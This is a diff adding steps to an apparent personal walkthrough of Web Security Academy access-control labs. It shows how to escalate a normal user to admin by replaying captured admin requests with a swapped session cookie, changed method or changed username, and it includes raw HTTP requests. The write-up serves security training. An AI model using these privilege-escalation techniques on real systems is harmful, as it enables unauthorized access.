@@ -136,5 +136,37 @@ Task 11:
 To solve this lab, log in as dministrator. On the admin panel promote carlos and send the request to repeater. Now log out, and log in as wiener. Copy wiener's session cookie, and copy it into the repeated request.
 After you send it it will response the request is Unauthorized. All you have to do is change the request methog to GET, and change the username to wiener, and send the request.
 
+Task 12:
+///Lab: Multi-step process with no access control on one step///
 
+Open the site in burp, log in as administrator, and upgrade carlos's account. There will be 2 POST request in the http history, the second one is a confirmation request. Send both request to repeater and log out.
+Log in as wiener, and copy our session cookie out. Paste it in the two request, and change the name part to wiener (in both request) like this:
+1st:
+POST /admin-roles HTTP/2
+Host: 0a0700e503bd145d807ab2de00d500ec.web-security-academy.net
+Cookie: session=4NgyHgyk8L9522cnDDmVQAHzCbBnhTVc
+...
+Origin: https://0a0700e503bd145d807ab2de00d500ec.web-security-academy.net
+Referer: https://0a0700e503bd145d807ab2de00d500ec.web-security-academy.net/admin
+...
 
+username=wiener&action=upgrade
+
+2nd:
+POST /admin-roles HTTP/2
+Host: 0a0700e503bd145d807ab2de00d500ec.web-security-academy.net
+Cookie: session=4NgyHgyk8L9522cnDDmVQAHzCbBnhTVc
+...
+Origin: https://0a0700e503bd145d807ab2de00d500ec.web-security-academy.net
+Referer: https://0a0700e503bd145d807ab2de00d500ec.web-security-academy.net/admin-roles
+...
+
+action=upgrade&confirmed=true&username=wiener
+
+Send the first one, then the 2nd, and we solved the lab.
+
+Task 13:
+///Lab: Referer-based access control///
+
+Open the site in burp, log in as administrator, upgrade carlos, send the GET /admin-roles?username... request to repeater then log out. Log in as wiener. From the /my-account?id=wiener request copy out the session cookie.
+Go to the repeater panel and change the session cookie to wiener's, and change the username in the url from carlos to wiener and send the request.
